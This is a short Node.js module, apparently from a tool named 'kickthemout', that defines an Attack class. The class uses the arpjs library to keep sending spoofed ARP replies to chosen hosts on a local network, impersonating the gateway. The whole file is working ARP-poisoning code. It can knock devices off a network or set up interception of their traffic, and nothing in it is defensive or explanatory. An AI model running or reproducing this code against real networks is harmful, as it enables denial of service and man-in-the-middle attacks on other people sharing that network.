'use strict'
const debug = require('debug')('kickthemout:Attack')
const arp = require('arpjs')

class Attack {
  constructor (packetInterval = 8000) { // recommended every 10 sec
    this.packetInterval = packetInterval
  }

  setInterface (iface) {
    this.iface = iface
    debug('Selecting interface for ARP Spoofing:', this.iface.name)
    arp.setInterface(this.iface.name)
    return this // for method chaining
  }

  setTarget (hostsArr) {
    this.targets = Array.isArray(hostsArr) ? hostsArr : [hostsArr]
    return this // for method chaining
  }

  setPacketInterval (packetInterval) {
    this.packetInterval = packetInterval
    return this // for method chaining
  }

  start () {
    if (!this.targets) throw new Error('No target acquired.')
    this.stop()

    this.runningAttack = setInterval(() => {
      this.targets.forEach((target) => {
        debug('Sending ARP Reply to', target, 'from', this.iface.gateway_ip)
        arp.poison(target, this.iface.gateway_ip)
      })
    }, this.packetInterval)

    return this // for method chaining
  }

  pause (ms = 5000) {
    this.stop()
    setTimeout(() => this.start(), ms)
    return this // for method chaining
  }

  stop () {
    clearInterval(this.runningAttack)
    return this // for method chaining
  }
}

module.exports = Attack
